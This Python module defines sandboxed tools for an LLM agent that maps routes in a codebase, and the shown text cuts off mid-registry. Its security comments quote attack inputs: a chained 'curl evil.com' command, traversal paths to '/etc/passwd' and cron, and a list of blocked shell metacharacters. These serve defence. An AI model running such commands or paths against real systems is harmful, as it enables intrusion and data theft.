"""Tool functions for agentic interaction enrichment.

Each function reads from the structural store or source files
and returns formatted text for the LLM to interpret.
"""
import re
from pathlib import Path
from typing import Optional

# Pagination constants
DEFAULT_LIMIT = 1000  # Default page size — sized so Kibana-scale scoped queries (~3,400 routes) finish in a handful of round-trips
MAX_LIMIT = 5000      # Hard cap — even when caller requests more, we clip; prevents single-call context blowups
MAX_FUNCTION_EXTRACT_LINES = 100  # Maximum lines to extract for a single function


def _paginate(items: list[str], offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """Return a page of items with a continuation hint if more exist."""
    if limit > MAX_LIMIT:
        limit = MAX_LIMIT
    total = len(items)
    page = items[offset:offset + limit]
    result = "\n".join(page)
    if offset + limit < total:
        result += f"\n... ({total - offset - limit} more, use offset={offset + limit})"
    return result


def read_calls(snapshot_path: str, file_pattern: str,
               offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """Read call graph entries matching a file pattern from _calls.txt."""
    calls_file = Path(snapshot_path) / "_calls.txt"
    if not calls_file.exists():
        return "(no call graph available)"
    lines = calls_file.read_text(encoding="utf-8", errors="replace").splitlines()
    matches = [l for l in lines if file_pattern in l and not l.startswith("#")]
    if not matches:
        return f"(no calls found for {file_pattern})"
    return _paginate(matches, offset, limit)


def read_index(snapshot_path: str, file_pattern: str,
               offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """Read symbol index entries matching a file pattern from _index.txt."""
    index_file = Path(snapshot_path) / "_index.txt"
    if not index_file.exists():
        return "(no index available)"
    lines = index_file.read_text(encoding="utf-8", errors="replace").splitlines()
    matches = [l for l in lines if file_pattern in l and not l.startswith("#")]
    if not matches:
        return f"(no symbols found for {file_pattern})"
    return _paginate(matches, offset, limit)


def read_imports(snapshot_path: str, file_pattern: str,
                 offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """Read import entries matching a file pattern from _imports.txt.

    When file_pattern is empty, returns a deduplicated summary of all unique
    modules imported across the project (useful for framework detection).
    """
    imports_file = Path(snapshot_path) / "_imports.txt"
    if not imports_file.exists():
        return "(no imports available)"
    lines = imports_file.read_text(encoding="utf-8", errors="replace").splitlines()
    data_lines = [l for l in lines if not l.startswith("#")]

    if not file_pattern or file_pattern.strip() == "":
        # Empty pattern: return unique modules summary for framework detection
        modules: dict[str, set[str]] = {}  # module → set of files that import it
        for line in data_lines:
            parts = line.split("\t")
            if len(parts) >= 2:
                file_path, module = parts[0], parts[1]
                if module not in modules:
                    modules[module] = set()
                modules[module].add(file_path)
        # Sort by number of files importing (most popular first)
        sorted_modules = sorted(modules.items(), key=lambda x: -len(x[1]))
        result_lines = [f"{mod}\t(imported by {len(files)} file(s))" for mod, files in sorted_modules]
        return _paginate(result_lines, offset, limit)

    matches = [l for l in data_lines if file_pattern in l]
    if not matches:
        return f"(no imports found for {file_pattern})"
    return _paginate(matches, offset, limit)


def read_inheritance(snapshot_path: str, file_pattern: str,
                     offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """Read inheritance entries matching a file or class pattern from _inheritance.txt."""
    inh_file = Path(snapshot_path) / "_inheritance.txt"
    if not inh_file.exists():
        return "(no inheritance data available)"
    lines = inh_file.read_text(encoding="utf-8", errors="replace").splitlines()
    matches = [l for l in lines if file_pattern in l and not l.startswith("#")]
    if not matches:
        return f"(no inheritance found for {file_pattern})"
    return _paginate(matches, offset, limit)


def read_source(project_root: str, file_path: str,
                start_line: int = None, end_line: int = None,
                function_name: str = None) -> str:
    """Read source code from a file.

    If function_name provided, extracts that function's source.
    If start_line/end_line provided, extracts that range.
    Otherwise returns the full file (truncated to 50 lines).

    The read is scoped to `project_root` — absolute paths and `..` segments
    are rejected so an LLM-supplied file_path can't escape the project tree.
    """
    if ".." in Path(file_path).parts:
        return "(blocked: file_path may not contain '..')"
    candidate_path = Path(project_root) / file_path
    try:
        candidate = candidate_path.resolve()
        candidate.relative_to(Path(project_root).resolve())
    except (ValueError, OSError):
        return f"(blocked: file_path escapes project_root: {file_path})"

    if not candidate.exists():
        return f"(file not found: {file_path})"

    try:
        lines = candidate.read_text(encoding="utf-8", errors="replace").splitlines()
    except Exception:
        return "(could not read file)"

    if function_name:
        return _extract_function(lines, function_name)

    if start_line and end_line:
        start = max(0, start_line - 1)
        end = min(len(lines), end_line)
        numbered = [f"{i+1}: {lines[i]}" for i in range(start, end)]
        return "\n".join(numbered)

    # Full file, truncated — use limit to control page size
    if len(lines) > DEFAULT_LIMIT:
        numbered = [f"{i+1}: {lines[i]}" for i in range(DEFAULT_LIMIT)]
        return "\n".join(numbered) + f"\n... ({len(lines) - DEFAULT_LIMIT} more lines, use start_line/end_line to read more)"
    return "\n".join(f"{i+1}: {l}" for i, l in enumerate(lines))


def _extract_function(lines: list[str], function_name: str) -> str:
    """Extract a function/method by name from source lines."""
    start = None
    indent = None
    result = []

    for i, line in enumerate(lines):
        if start is None:
            # Look for function definition
            if re.search(rf'\bdef\s+{re.escape(function_name)}\b'
                         rf'|\bfunc\s+.*{re.escape(function_name)}\b'
                         rf'|\b(public|private|protected).*\s+{re.escape(function_name)}\s*\(',
                         line):
                start = i
                indent = len(line) - len(line.lstrip())
                result.append(f"{i+1}: {line}")
        else:
            # Collect until we hit a line at same or lower indent (next function)
            current_indent = len(line) - len(line.lstrip()) if line.strip() else indent + 1
            if line.strip() and current_indent <= indent and len(result) > 1:
                break
            result.append(f"{i+1}: {line}")
            if len(result) > MAX_FUNCTION_EXTRACT_LINES:
                result.append("... (truncated)")
                break

    if not result:
        return f"(function {function_name} not found)"
    return "\n".join(result)


def read_endpoints(snapshot_path: str, file_pattern: str,
                   offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """Read discovered endpoints from _endpoints.txt, filter by pattern.

    When file_pattern is empty, returns all endpoints.
    """
    ep_file = Path(snapshot_path) / "_endpoints.txt"
    if not ep_file.exists():
        return "(no endpoints data available)"
    lines = ep_file.read_text(encoding="utf-8", errors="replace").splitlines()
    data_lines = [l for l in lines if not l.startswith("#")]

    if not file_pattern or file_pattern.strip() == "":
        if not data_lines:
            return "(no endpoints found)"
        return _paginate(data_lines, offset, limit)

    matches = [l for l in data_lines if file_pattern in l]
    if not matches:
        return f"(no endpoints found for {file_pattern})"
    return _paginate(matches, offset, limit)


def read_interactions(snapshot_path: str, file_pattern: str,
                      offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """Read discovered interactions from _interactions.txt, filter by pattern.

    When file_pattern is empty, returns all interactions.
    """
    int_file = Path(snapshot_path) / "_interactions.txt"
    if not int_file.exists():
        return "(no interactions data available)"
    lines = int_file.read_text(encoding="utf-8", errors="replace").splitlines()
    data_lines = [l for l in lines if not l.startswith("#")]

    if not file_pattern or file_pattern.strip() == "":
        if not data_lines:
            return "(no interactions found)"
        return _paginate(data_lines, offset, limit)

    matches = [l for l in data_lines if file_pattern in l]
    if not matches:
        return f"(no interactions found for {file_pattern})"
    return _paginate(matches, offset, limit)


def glob(project_root: str, file_pattern: str,
               offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """List source files matching a glob pattern.

    Agent controls pagination via offset/limit — request more if needed.
    Excludes .git, node_modules, vendor, __pycache__.
    Early-terminates the tree walk once enough matches for the current page
    (plus a small buffer) are collected — avoids walking 60K+ files when
    only the first page is needed.
    """
    if limit > MAX_LIMIT:
        limit = MAX_LIMIT
    root = Path(project_root)
    if not root.exists():
        return f"(directory not found: {project_root})"

    SAFETY_BUFFER = 100  # extra results so the continuation hint can show an accurate "N more"
    target = offset + limit + SAFETY_BUFFER

    exclude = {".git", "node_modules", "vendor", "__pycache__", ".venv", "venv"}
    globs = _expand_braces(file_pattern if file_pattern else "*")
    matches = []
    seen = set()
    for g in globs:
        for f in root.rglob(g):
            if f.is_file() and not any(part in exclude for part in f.parts):
                rel = str(f.relative_to(root)).replace("\\", "/")
                if rel not in seen:
                    seen.add(rel)
                    matches.append(rel)
                    if len(matches) >= target:
                        break
        if len(matches) >= target:
            break

    if not matches:
        return f"(no files matching {file_pattern})"

    total = len(matches)
    page = matches[offset:offset + limit]
    result = "\n".join(page)
    if offset + limit < total:
        result += f"\n... ({total - offset - limit}+ more, use offset={offset + limit})"
    return result


def _expand_braces(glob_pattern: str) -> list[str]:
    """Expand brace patterns like **/*.{ts,js} into multiple globs.

    Returns ['**/*.ts', '**/*.js']. If no braces, returns [glob_pattern].
    """
    import re
    m = re.search(r'\{([^}]+)\}', glob_pattern)
    if not m:
        return [glob_pattern]
    prefix = glob_pattern[:m.start()]
    suffix = glob_pattern[m.end():]
    return [f"{prefix}{alt}{suffix}" for alt in m.group(1).split(",")]


def grep(project_root: str, pattern: str, file_glob: str = "**/*",
         offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """Search file contents for a pattern (string or regex).

    Returns file:line:match for each hit.
    Supports brace expansion: **/*.{ts,js} expands to **/*.ts + **/*.js.
    Agent controls pagination via offset/limit.
    Files larger than 10 MB are skipped to prevent memory exhaustion on
    repos with checked-in dumps, generated SQL, large JSON, or vendor blobs.
    """
    import re
    if limit > MAX_LIMIT:
        limit = MAX_LIMIT
    MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB cap

    root = Path(project_root)
    if not root.exists():
        return f"(directory not found: {project_root})"

    exclude = {".git", "node_modules", "vendor", "__pycache__", ".venv", "venv"}
    try:
        compiled = re.compile(pattern)
    except re.error:
        compiled = None

    globs = _expand_braces(file_glob)
    matches = []
    seen_files = set()
    for g in globs:
        for f in root.rglob(g):
            if f in seen_files:
                continue
            seen_files.add(f)
            if not f.is_file() or any(part in exclude for part in f.parts):
                continue
            try:
                if f.stat().st_size > MAX_FILE_SIZE:
                    continue
                text = f.read_text(encoding="utf-8", errors="replace")
                for i, line in enumerate(text.splitlines(), 1):
                    hit = False
                    if compiled:
                        hit = bool(compiled.search(line))
                    else:
                        hit = pattern in line
                    if hit:
                        rel = str(f.relative_to(root)).replace("\\", "/")
                        matches.append(f"{rel}:{i}:{line.strip()}")
            except Exception:
                continue

    if not matches:
        return f"(no matches for '{pattern}' in {file_glob})"

    total = len(matches)
    page = matches[offset:offset + limit]
    result = "\n".join(page)
    if offset + limit < total:
        result += f"\n... ({total - offset - limit} more, use offset={offset + limit})"
    return result


MANIFEST_FILES = (
    "package.json", "composer.json", "Gemfile", "Gemfile.lock",
    "go.mod", "go.sum", "pom.xml", "build.gradle", "build.gradle.kts",
    "requirements.txt", "pyproject.toml", "setup.py", "setup.cfg",
    "manage.py", "artisan", "Cargo.toml", "Cargo.lock",
    "CMakeLists.txt", "Makefile", "Rakefile", "Pipfile", "Pipfile.lock",
)


def read_manifest_contents(project_root: str, manifest_name: str = "",
                            max_chars: int = 600) -> str:
    """Return the first `max_chars` of one or more manifest files at the
    project root. Empty manifest_name → scan all known manifests.

    `manifest_name` must be a plain filename (no path separators or `..`)
    so an LLM can't read outside project_root by passing e.g. `../etc/passwd`.
    """
    root = Path(project_root)
    if manifest_name and ("/" in manifest_name or "\\" in manifest_name or ".." in manifest_name):
        return f"(blocked: manifest_name must be a plain filename, got '{manifest_name}')"
    names = [manifest_name] if manifest_name else list(MANIFEST_FILES)
    out_parts: list[str] = []
    for n in names:
        p = root / n
        if not p.exists() or not p.is_file():
            if manifest_name:
                return f"(not found: {n})"
            continue
        try:
            snippet = p.read_text(encoding="utf-8", errors="replace")[:max_chars]
        except OSError as e:
            out_parts.append(f"## {n}: ERROR {e}")
            continue
        out_parts.append(f"## {n}:\n{snippet}")
    if not out_parts:
        return "(no manifest files found at project root)"
    return "\n\n".join(out_parts)


def list_directory_names(project_root: str, depth: int = 1,
                          offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """List directory names at the project root, up to `depth` levels deep.
    Excludes .git, node_modules, vendor, target, dist, build, __pycache__, .venv."""
    if limit > MAX_LIMIT:
        limit = MAX_LIMIT
    EXCLUDE = {".git", "node_modules", "vendor", "target", "dist", "build",
                "__pycache__", ".venv", "venv", ".idea", ".vscode"}
    root = Path(project_root)
    if not root.exists():
        return f"(project_root does not exist: {project_root})"
    target = offset + limit + 100  # small buffer for accurate continuation hint
    out: list[str] = []
    queue: list[tuple[Path, int]] = [(root, 0)]
    while queue and len(out) < target:
        cur, d = queue.pop(0)
        if d >= depth:
            continue
        try:
            children = sorted(cur.iterdir(), key=lambda p: p.name)
        except OSError:
            continue
        for c in children:
            if not c.is_dir() or c.name in EXCLUDE:
                continue
            try:
                rel = str(c.relative_to(root)).replace("\\", "/")
            except ValueError:
                continue
            out.append(rel)
            if len(out) >= target:
                break
            queue.append((c, d + 1))
    if not out:
        return "(no directories found)"
    return _paginate(out, offset, limit)


def query_callers(snapshot_path: str, symbol: str, depth: int = 3,
                   offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """Reverse blast radius via the dep graph: who calls `symbol` (transitively)."""
    from src.dep import DepGraph, impact_of
    graph = DepGraph.open_or_build(snapshot_path)
    try:
        report = impact_of(graph, symbol, depth=depth, include_endpoints=False)
    finally:
        graph.close()
    if not report.direct_callers and not report.transitive_callers:
        if report.notes:
            return f"(no callers: {'; '.join(report.notes)})"
        return f"(no callers found for {symbol})"
    items: list[str] = [f"# {report.symbol} — {report.total_callers} caller(s) within depth={depth}"]
    for c in report.direct_callers:
        items.append(f"  direct: {c.qualified_name}\t{c.file or ''}:{c.line or ''}")
    for c in report.transitive_callers:
        items.append(f"  depth={c.depth}: {c.qualified_name}")
    return _paginate(items, offset, limit)


def query_callees(snapshot_path: str, symbol: str, depth: int = 3,
                   offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """Forward blast radius via the dep graph: what does `symbol` call (transitively)."""
    from src.dep import DepGraph, impact_of
    graph = DepGraph.open_or_build(snapshot_path)
    try:
        report = impact_of(graph, symbol, depth=depth, include_endpoints=False)
    finally:
        graph.close()
    callees = report.direct_callees + report.transitive_callees
    if not callees:
        if report.notes:
            return f"(no callees: {'; '.join(report.notes)})"
        return f"(no callees found for {symbol})"
    items: list[str] = [f"# {report.symbol} calls {len(callees)} symbol(s) within depth={depth}"]
    for c in callees:
        items.append(f"  depth={c.depth}: {c.qualified_name}")
    return _paginate(items, offset, limit)


def read_directory(project_root: str, path: str = "",
                   offset: int = 0, limit: int = DEFAULT_LIMIT) -> str:
    """List directory contents — files and subdirectories.

    Returns entries with type markers: [dir] or [file]. Paginated.
    The listing is scoped to `project_root` — absolute paths and `..`
    segments are rejected so an LLM-supplied `path` can't escape the tree.
    """
    if limit > MAX_LIMIT:
        limit = MAX_LIMIT
    if path and ".." in Path(path).parts:
        return "(blocked: path may not contain '..')"
    root = Path(project_root) / path if path else Path(project_root)
    try:
        root_resolved = root.resolve()
        root_resolved.relative_to(Path(project_root).resolve())
    except (ValueError, OSError):
        return f"(blocked: path escapes project_root: {path})"
    root = root_resolved
    if not root.exists():
        return f"(directory not found: {path or project_root})"
    if not root.is_dir():
        return f"(not a directory: {path})"

    exclude = {".git", "node_modules", "vendor", "__pycache__", ".venv"}
    entries = []
    for item in sorted(root.iterdir()):
        if item.name in exclude:
            continue
        if item.is_dir():
            entries.append(f"[dir]  {item.name}/")
        else:
            entries.append(f"[file] {item.name}")

    if not entries:
        return "(empty directory)"
    return _paginate(entries, offset, limit)


def write_script(project_root: str, script_content: str, filename: str = "parser.py", **kwargs) -> str:
    """Write a Python script to a temp directory for execution.

    The agent writes parser scripts that mechanically extract routes from
    framework-specific files. The script is saved and can then be run with
    run_framework_command("python /tmp/discovery/<filename>").

    Returns the full path to the written script.
    """
    import re
    import tempfile
    script_dir = Path(tempfile.gettempdir()) / "discovery"
    script_dir.mkdir(exist_ok=True)

    # Safety: only allow plain .py filenames — no path separators, no traversal,
    # no leading dot. Without this, an LLM could pass `../../etc/cron.d/0evil.py`
    # or an absolute path to escape the discovery dir.
    if not re.match(r"^[A-Za-z0-9_-][A-Za-z0-9._-]*\.py$", filename) or ".." in filename:
        return f"(blocked: filename must match [A-Za-z0-9._-]+.py with no '..', got '{filename}')"

    script_path = script_dir / filename
    # Defense in depth: even if the regex is bypassed, refuse anything that
    # resolves outside script_dir.
    try:
        script_path.resolve().relative_to(script_dir.resolve())
    except ValueError:
        return f"(blocked: script path escapes discovery dir, got '{filename}')"
    # LLMs may pass script content in two formats:
    # 1. With real newlines (triple-quoted or multiline) — use as-is
    # 2. With escaped \\n (single-line JSON-like string) — needs unescaping
    if "\n" in script_content:
        # Already has real newlines — use as-is
        content = script_content
    else:
        # Single line with escaped newlines — JSON decode to unescape properly
        try:
            import json as _json
            content = _json.loads(f'"{script_content}"')
        except (_json.JSONDecodeError, ValueError):
            content = script_content.replace("\\n", "\n").replace("\\t", "\t")
    script_path.write_text(content, encoding="utf-8")
    return f"Script written to: {script_path}"


def run_framework_command(project_root: str, command: str) -> str:
    """Run a framework-specific command to extract routes/endpoints.

    The LLM decides what command to run based on its framework knowledge:
      - Rails: "bundle exec rails routes"
      - Django: "python manage.py show_urls"
      - Laravel: "php artisan route:list --json"
      - Flask: "flask routes"

    Security model:
      - No shell — `shlex.split` to argv, run with `shell=False`. Shell
        metacharacters (`;`, `|`, `&&`, `$()`, backticks) are literal args,
        not interpreted. This kills the prior command-chaining vector
        (e.g. "cat file; curl evil.com") that the prefix allowlist alone
        let through.
      - Tighter allowlist — dropped `python -c` (LLM should write a script
        via write_script then run it), `npm`/`npx`/`gradle`/`mvn`/
        `composer`/`gem` (all can execute arbitrary code via lifecycle
        scripts / plugins).
      - Reject commands with shell-meta chars before parsing — defense in
        depth in case shlex tokenizes them oddly.
      - Read-only intent only — no writes, no installs.

    Timeout: 30 seconds.
    """
    import subprocess
    import shlex

    # Defense-in-depth: refuse anything that looks like shell chaining or
    # substitution before we even parse. Single quotes/backslashes are still
    # legitimate and handled by shlex.
    forbidden = (";", "|", "&", "`", "$(", "<(", ">(", "\n", "\r")
    for tok in forbidden:
        if tok in command:
            return f"(blocked: command contains shell metacharacter '{tok}')"

    cmd_lower = command.lower()

    # Exact-match commands (no arguments needed, fully trusted)
    exact_commands = [
        "bundle exec rails routes",
        "bundle exec rake routes",
        "rails routes",
        "rake routes",
        "flask routes",
        "mix phx.routes",
    ]
    if cmd_lower.strip() in exact_commands:
        pass  # trusted, skip all checks

    # Prefix-match commands (trusted prefix, arguments allowed)
    elif any(cmd_lower.startswith(p) for p in [
        "python manage.py show_urls",
        "php artisan route:list",
    ]):
        pass  # trusted framework commands

    # Read-only filesystem commands. Note: `python -c` removed — the LLM
    # should use write_script + run_framework_command("python <path>") for
    # any non-trivial code. `npm`/`gradle`/`mvn` etc removed because their
    # script-runner subcommands execute arbitrary user code.
    elif any(cmd_lower.startswith(p) for p in [
        "find ", "ls", "cat ", "head ", "tail ", "wc ",
        "tree", "grep ", "rg ", "awk ", "sed -n",
        "dotnet list", "go list", "cargo metadata",
        "composer show", "gem list",
        "sort ", "uniq ", "cut ",
    ]):
        pass  # read-only commands

    # Python scripts: only file execution is allowed (argv form). The
    # earlier `python -c "..."` path is gone; substring blocklists for
    # "os.remove" etc were trivial to bypass with __import__/getattr.
    elif cmd_lower.startswith("python3 ") or cmd_lower.startswith("python "):
        # Tokenize and verify: no `-c`, no `-m` runner that could pull in
        # arbitrary modules to execute (e.g. `python -m pip install ...`).
        try:
            tokens = shlex.split(command)
        except ValueError as e:
            return f"(blocked: could not parse command — {e})"
        if any(t in ("-c", "-m") for t in tokens[1:]):
            return "(blocked: 'python -c' / 'python -m' not allowed; use write_script + 'python <path>')"

    else:
        allowed_summary = (
            "rails routes, python <script.py>, python manage.py show_urls, "
            "php artisan route:list, flask routes, find, ls, cat, head, tail, "
            "grep, rg, awk, sed -n"
        )
        return (
            f"(command not in allowlist: '{command}')\n"
            f"Allowed: {allowed_summary}\n"
            "If you need a different command, use grep or read_source instead."
        )

    root = Path(project_root)
    if not root.exists():
        return f"(project root not found: {project_root})"

    try:
        # Tokenize to argv form. shell=False prevents the OS shell from
        # interpreting metachars even if one slips past the check above.
        try:
            argv = shlex.split(command)
        except ValueError as e:
            return f"(blocked: could not parse command — {e})"
        if not argv:
            return "(blocked: empty command)"
        result = subprocess.run(
            argv,
            shell=False,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            cwd=str(root),
            timeout=30,
        )

        output = result.stdout
        if result.returncode != 0:
            error = result.stderr.strip()
            if not output:
                return f"(command failed with exit code {result.returncode})\n{error[:500]}"
            # Some commands write to stderr but still produce useful output
            output += f"\n(stderr: {error[:200]})"

        if not output.strip():
            return "(command produced no output)"

        # Don't truncate JSON array output (from parser scripts)
        stripped = output.strip()
        if stripped.startswith("[") and stripped.endswith("]"):
            return output
        # Also don't truncate FINAL_ANSWER-prefixed JSON
        if "FINAL_ANSWER" in stripped and "[" in stripped and stripped.endswith("]"):
            return output

        # Truncate very long non-JSON output
        lines = output.splitlines()
        if len(lines) > 500:
            return "\n".join(lines[:500]) + f"\n... ({len(lines) - 500} more lines)"

        return output

    except subprocess.TimeoutExpired:
        return f"(command timed out after 30 seconds: '{command}')"
    except Exception as e:
        return f"(error running command: {e})"


def get_openai_tool_schemas() -> list[dict]:
    """Return tool definitions in OpenAI function calling format.

    Used for Claude (via OpenAI-compatible proxy) and any provider that
    supports native tool/function calling.
    """
    return [
        {
            "type": "function",
            "function": {
                "name": "read_calls",
                "description": "Read call graph entries for a file. Shows who calls what, with confidence scores.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "file_pattern": {"type": "string", "description": "File name or path fragment to match"},
                        "offset": {"type": "integer", "description": "Skip first N results", "default": 0},
                        "limit": {"type": "integer", "description": "Max results to return", "default": 50},
                    },
                    "required": ["file_pattern"],
                },
            },
        },
        {
            "type": "function",
            "function": {
                "name": "read_index",
                "description": "Read symbol index for a file. Shows classes, methods, variables with types and signatures.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "file_pattern": {"type": "string", "description": "File name or path fragment to match"},
                        "offset": {"type": "integer", "description": "Skip first N results", "default": 0},
                        "limit": {"type": "integer", "description": "Max results to return", "default": 50},
                    },
                    "required": ["file_pattern"],
                },
            },
        },
        {
            "type": "function",
            "function": {
                "name": "read_imports",
                "description": "Read import statements for a file. Empty pattern returns unique module summary for framework detection.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "file_pattern": {"type": "string", "description": "File name or path fragment to match"},
                        "offset": {"type": "integer", "description": "Skip first N results", "default": 0},
                        "limit": {"type": "integer", "description": "Max results to return", "default": 50},
                    },
                    "required": ["file_pattern"],
                },
            },
        },
        {
            "type": "function",
            "function": {
                "name": "read_inheritance",
                "description": "Read inheritance relationships for a file or class. Shows extends/implements.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "file_pattern": {"type": "string", "description": "File or class name to match"},
                        "offset": {"type": "integer", "description": "Skip first N results", "default": 0},
                        "limit": {"type": "integer", "description": "Max results to return", "default": 50},
                    },
                    "required": ["file_pattern"],
                },
            },
        },
        {
            "type": "function",
            "function": {
                "name": "read_source",
                "description": "Read source code from a file. Can read a specific function, line range, or full file (first 50 lines).",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "file_path": {"type": "string", "description": "Path to the source file"},
                        "start_line": {"type": "integer", "description": "Start line number"},
                        "end_line": {"type": "integer", "description": "End line number"},
                        "function_name": {"type": "string", "description": "Extract a specific function by name"},
                    },
                    "required": ["file_path"],
                },
            },
        },
        {
            "type": "function",
            "function": {
                "name": "glob",
                "description": "List source files matching a glob pattern. Use to discover project structure.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "file_pattern": {"type": "string", "description": "Glob pattern (e.g. '**/*.rb', 'app/controllers/**')"},
                        "offset": {"type": "integer", "description": "Skip first N results", "default": 0},
                        "limit": {"type": "integer", "description": "Max results to return", "default": 50},
                    },
                    "required": ["file_pattern"],
                },
            },
        },
        {
            "type": "function",
            "function": {
                "name": "grep",
                "description": "Search file contents for a pattern (string or regex). Returns file:line:match.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "pattern": {"type": "string", "description": "Search string or regex pattern"},
                        "file_glob": {"type": "string", "description": "Glob to filter files", "default": "**/*"},
                        "offset": {"type": "integer", "description": "Skip first N results", "default": 0},
                        "limit": {"type": "integer", "description": "Max results to return", "default": 50},
                    },
                    "required": ["pattern"],
                },
            },
        },
        {
            "type": "function",
            "function": {
                "name": "read_directory",
                "description": "List directory contents — files and subdirectories with [dir]/[file] markers.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": {"type": "string", "description": "Directory path relative to project root (empty for root)", "default": ""},
                    },
                    "required": [],
                },
            },
        },
        {
            "type": "function",
            "function": {
                "name": "run_framework_command",
                "description": "Run a framework-specific command to extract routes. Use when you detect a framework: 'rails routes' for Rails, 'python manage.py show_urls' for Django, 'php artisan route:list' for Laravel, etc.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "command": {"type": "string", "description": "The command to run (e.g. 'bundle exec rails routes', 'python manage.py show_urls')"},
                    },
                    "required": ["command"],
                },
            },
        },
        {
            "type": "function",
            "function": {
                "name": "write_script",
                "description": "Write a Python script to temp directory. Then run it with run_framework_command('python /tmp/discovery/parser.py'). Use this to create mechanical parsers for route files.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "script_content": {"type": "string", "description": "Python script source code"},
                        "filename": {"type": "string", "description": "Filename (must end in .py)", "default": "parser.py"},
                    },
                    "required": ["script_content"],
                },
            },
        },
    ]


# Tool registry for the LLM agent
TOOLS = {
    "read_calls": {
        "function": read_calls,
        "description": "Read call graph entries for a file. Shows who calls what, with confidence scores. Paginate with offset/limit.",
        "params": {
            "file_pattern": "file name or path fragment to match",
            "offset": "(optional) skip first N results, default 0",
            "limit": "(optional) max results to return, default 1000",
        },
    },
    "read_index": {
        "function": read_index,
        "description": "Read symbol index for a file. Shows classes, methods, variables with types and signatures. Paginate with offset/limit.",
        "params": {
            "file_pattern": "file name or path fragment to match",
            "offset": "(optional) skip first N results, default 0",
            "limit": "(optional) max results to return, default 1000",
        },
    },
    "read_imports": {
        "function": read_imports,
        "description": "Read import statements for a file. Paginate with offset/limit.",
        "params": {
            "file_pattern": "file name or path fragment to match",
            "offset": "(optional) skip first N results, default 0",
            "limit": "(optional) max results to return, default 1000",
        },
    },
    "read_inheritance": {
        "function": read_inheritance,
        "description": "Read inheritance relationships for a file or class. Shows extends/implements. Paginate with offset/limit.",
        "params": {
            "file_pattern": "file or class name to match",
            "offset": "(optional) skip first N results, default 0",
            "limit": "(optional) max results to return, default 1000",
        },
    },
    "read_source": {
        "function": read_source,
        "description": "Read source code. Can read a specific function, line range, or full file (first 50 lines).",
        "params": {
            "file_path": "path to the source file",
            "start_line": "(optional) start line number",
            "end_line": "(optional) end line number",
            "function_name": "(optional) extract a specific function by name",
        },
    },
    "read_endpoints": {
        "function": read_endpoints,
        "description": "Read discovered API endpoints. Shows path, method, protocol, handler class, framework. Paginate with offset/limit.",
        "params": {
            "file_pattern": "file name or path fragment to match (empty for all)",
            "offset": "(optional) skip first N results, default 0",
            "limit": "(optional) max results to return, default 1000",
        },
    },
    "read_interactions": {
        "function": read_interactions,
        "description": "Read discovered external interactions. Shows target, mechanism, direction, data_hint, source class. Paginate with offset/limit.",
        "params": {
            "file_pattern": "file name or path fragment to match (empty for all)",
            "offset": "(optional) skip first N results, default 0",
            "limit": "(optional) max results to return, default 1000",
        },
    },
    "glob": {
        "function": glob,
        "description": "List source files matching a glob pattern. Use to discover project structure. Paginate with offset/limit.",
        "params": {
            "file_pattern": "glob pattern (e.g., '**/*.rb', 'app/controllers/**', '**/Gemfile')",
            "offset": "(optional) skip first N results, default 0",
            "limit": "(optional) max results to return, default 1000",
        },
    },
    "grep": {
        "function": grep,
        "description": "Search file contents for a pattern (string or regex). Returns file:line:match. Paginate with offset/limit.",
        "params": {
            "pattern": "search string or regex pattern",
            "file_glob": "(optional) glob to filter files, default '**/*'",
            "offset": "(optional) skip first N results, default 0",
            "limit": "(optional) max results to return, default 1000",
        },
    },
    "read_directory": {
        "function": read_directory,
        "description": "List directory contents — files and subdirectories. Shows [dir] and [file] markers.",
        "params": {"path": "directory path relative to project root (empty for root)"},
    },
    "read_manifest_contents": {
        "function": read_manifest_contents,
        "description": "Read first N chars of manifest file(s) at the project root (package.json, composer.json, Gemfile, go.mod, pom.xml, build.gradle, requirements.txt, pyproject.toml, etc.). Useful for identifying the framework + its dependencies.",
        "params": {
            "manifest_name": "(optional) specific manifest filename; empty = scan all known manifests",
            "max_chars": "(optional) max chars per file, default 600",
        },
    },
    "list_directory_names": {
        "function": list_directory_names,
        "description": "List directory names at the project root, up to N levels deep (default 1). Excludes node_modules, vendor, .git, target, dist, build.",
        "params": {
            "depth": "(optional) levels deep to walk, default 1",
            "max_dirs": "(optional) max directories to return, default 20",
        },
    },
    "run_framework_command": {
        "function": run_framework_command,
        "description": "Run a framework command to extract routes (e.g. 'rails routes', 'python manage.py show_urls', 'php artisan route:list').",
        "params": {"command": "framework command to run"},
    },
    "write_script": {
        "function": write_script,
        "description": "Write a Python script to a temp directory. Use with run_framework_command to execute it. Example: write_script(script_content='import re\\n...', filename='parser.py') then run_framework_command(command='python /tmp/discovery/parser.py')",
        "params": {
            "script_content": "Python script source code",
            "filename": "(optional) filename, default 'parser.py'",
        },
    },
    "query_callers": {
        "function": query_callers,
        "description": "Reverse blast radius via the dep graph: who calls this symbol (transitively up to depth). Pre-computed; use instead of grepping for call sites. Paginate with offset/limit.",
        "params": {
            "symbol": "qualified_name (preferred) or bare name",
            "depth": "(optional) BFS depth, default 3",
            "offset": "(optional) skip first N results, default 0",
            "limit": "(optional) max results to return, default 1000",
        },
    },
    "query_callees": {
        "function": query_callees,
        "description": "Forward blast radius via the dep graph: what does this symbol call (transitively up to depth). Paginate with offset/limit.",
        "params": {
